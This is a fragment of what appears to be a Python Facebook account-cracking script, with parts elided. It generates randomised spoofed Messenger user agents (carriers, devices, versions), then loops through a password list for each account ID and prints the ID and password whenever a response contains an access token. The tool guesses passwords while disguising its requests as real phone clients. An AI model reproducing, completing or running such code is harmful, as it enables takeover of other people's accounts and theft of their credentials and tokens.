...
def generate_random_user0_agent():
    user_agent_template = (
        ...
        'FBSV/{os_version};FBCA/{cpu_architecture};SIM/{sim_name};MODEL/{model_name}]' )

    version = f"{random.randint(11, 99)}.0.0.{random.randint(1111, 9999)}"
    version_code = random.randint(1, 100)
    device_density = random.uniform(1.0, 4.0)
    language = "en_US"
    revision = random.randint(100000000, 999999999) 
 # Adjust revision as per your requirement
    carrier = random.choice(["Banglalink", "Robi", "MTN-CG", "Grameenphone", "Artel", "Teletalk", "UMobaile", "Digi"])
    manufacturer = "Samsung"
    brand = random.choice(["Samsung", "Xiaomi", "OPPO", "Huawei", "Motorola"])
    package = "com.facebook.orca"
    device = random.choice(["A37f", "SM-G930F", "SM-J210F", "MI 5X", "SM-G950U", "SM-N9005"])
    os_version = "9.0.1"
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r{xd}{P} SHUVO-CP '+cid+' | '+pas+'\033[1;92m')
